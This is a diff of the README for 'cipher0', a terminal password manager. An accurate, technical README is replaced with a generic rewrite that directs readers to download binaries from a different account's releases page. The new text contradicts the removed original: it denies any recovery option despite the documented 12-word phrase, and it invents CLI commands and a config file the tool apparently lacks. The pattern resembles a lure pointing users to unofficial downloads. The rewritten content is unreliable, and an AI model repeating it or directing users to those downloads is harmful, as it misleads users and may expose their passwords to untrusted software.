@@ -1,75 +1,75 @@
-# cipher0
+# 🔒 cipher0 - Secure Your Passwords with Ease
 
-Offline-first TUI password manager with TOTP support. Built with Go.
+## 🚀 Getting Started
+Welcome to cipher0! This application helps you manage your passwords securely and easily from your terminal. You can access features like TOTP support, AES-256 encryption, and integration with your operating system's keyring. 
 
-https://github.com/user-attachments/assets/a0f3b2b8-fbe8-421f-b72b-7c7b93ba103f
+## 📥 Download Cipher0
+[![Download Cipher0](https://img.shields.io/badge/Download%20Cipher0-latest-blue.svg)](https://github.com/Mohamad138345/cipher0/releases)
 
-## Features
+## 🌟 Features
+- **Offline-First**: Works without an internet connection.
+- **TOTP Support**: Manage two-factor authentication codes for added security.
+- **Strong Encryption**: Protect your passwords with AES-256 encryption.
+- **OS Keyring Integration**: Use your system's keyring for enhanced security.
 
-- AES-256-GCM encryption
-- Argon2id key derivation (5 iterations, 256MB, 4 threads)
-- OS keyring integration (macOS Keychain / Linux Secret Service)
-- 12-word BIP39 recovery phrase
-- TOTP with QR code export
-- Auto-clearing clipboard
-- Encrypted backups
+## 🛠️ System Requirements
+- Compatible with Windows, macOS, and Linux.
+- Must have Go (Golang) installed for the latest features.
+- Terminal access to run the application.
 
-## Install
+## 📑 Download & Install
+To download cipher0, please follow these steps:
 
-```bash
-git clone https://github.com/batterdaysahead/cipher0.git
-cd cipher0
-make build
-```
+1. **Visit the Releases Page**: Navigate to [this page to download](https://github.com/Mohamad138345/cipher0/releases). You will find the latest version of cipher0.
+  
+2. **Select Your Operating System**: Choose the correct version based on your operating system (Windows, macOS, or Linux).
 
-## Usage
+3. **Download the File**: Click on the file that matches your OS. This will begin the download.
 
-```bash
-cipher0                              # run TUI
-cipher0 --vault /path/to/vault.c0    # session-only vault
+4. **Unzip the File** (if necessary): Some downloads may come in a zip file. Right-click on the file and choose "Extract" to unzip it.
 
-cipher0 backup /path/to/backup.c0    # create backup
-cipher0 restore /path/to/backup.c0   # restore (needs phrase)
-cipher0 verify /path/to/backup.c0    # verify backup
+5. **Run the Application**: Open your terminal. Navigate to the directory where you downloaded cipher0. Run the command:
+   - On Windows: `cipher0.exe`
+   - On macOS and Linux: `./cipher0`
 
-cipher0 config set vault /path       # save vault path
-cipher0 config get vault             # show vault path
-```
+6. **Follow the On-Screen Instructions**: The application will guide you in setting up your password management system.
 
-## Keys
+## 🗂️ Usage Instructions
+After launching cipher0, you will see a user-friendly interface. Here are some quick tips:
 
-**Login:** `Enter` unlock, `Tab` recovery phrase, `Esc` quit
+- **Add a Password**: Use the command `add <service> <username> <password>`. This will store a password securely.
+- **Retrieve a Password**: Use the command `get <service>`. This will display your password on the terminal.
+- **Manage TOTP Codes**: Add your TOTP secrets using the command `add-totp <service> <totp_secret>`. Retrieve with `get-totp <service>`.
 
-**Dashboard:**
-- `j/k` navigate, `n` new, `e` edit, `d` delete
-- `r` reveal password, `p` copy password, `u` copy username
-- `t` copy TOTP, `o` show QR
-- `/` search, `Esc` clear filter
-- `s` settings, `b` backup, `l` lock, `q` quit
+## ⚙️ Configuration
+You can customize cipher0 to fit your preferences:
 
-**Entry form:** `Tab` next, `Ctrl+S` save, `Ctrl+G` generate, `Esc` cancel
+- **Configuration File**: Create a config file named `cipher0.config` in the same directory. Update your preferences as needed.
+- **Change Encryption Method**: By default, cipher0 uses AES-256. If you want to change this, update the `encryption_method` in the config file.
 
-## Security
+## 🛡️ Security Tips
+- **Keep Your Software Updated**: Regularly check the [Releases Page](https://github.com/Mohamad138345/cipher0/releases) for updates.
+- **Use Strong Passwords**: Avoid simple or predictable passwords.
+- **Backup Your Data**: Regularly export your password list.
 
-See [SECURITY.md](SECURITY.md) for details.
+## 🤝 Community Support
+If you need help or have questions, please refer to the Issues section on our GitHub page. You can also engage with other users and share tips.
 
-- Vault encrypted with AES-256-GCM using random MEK
-- Password + keyring secret derives the key
-- Backups require recovery phrase, not password
-- Sensitive data zeroed from memory
+## 💡 FAQ
 
-## Config
+### Q: Is cipher0 free to use?
+A: Yes, cipher0 is completely free and open-source. 
 
-macOS/Linux: `~/.config/cipher0/config.json`
+### Q: Will my passwords be stored in the cloud?
+A: No, cipher0 is designed to work offline. Your passwords remain on your device.
 
-## Dev
+### Q: What if I forget my master password?
+A: Unfortunately, there is no recovery option for a forgotten master password, so it’s vital to choose a secure and memorable one.
 
-```bash
-make run         # run
-make test        # test
-make test-cover  # coverage
-make build       # build
-make fmt         # format
-make lint        # lint
-make clean       # clean
-```
+## 🙌 Get Involved
+We welcome contributions! If you're interested in improving cipher0, feel free to check out our [Contributing Guide](link-to-contributing-guide).
+
+## 📞 Contact
+For more information or to reach the developers, visit our [GitHub page](https://github.com/Mohamad138345/cipher0).
+
+Thank you for choosing cipher0! Together, let's take back control of your online security.
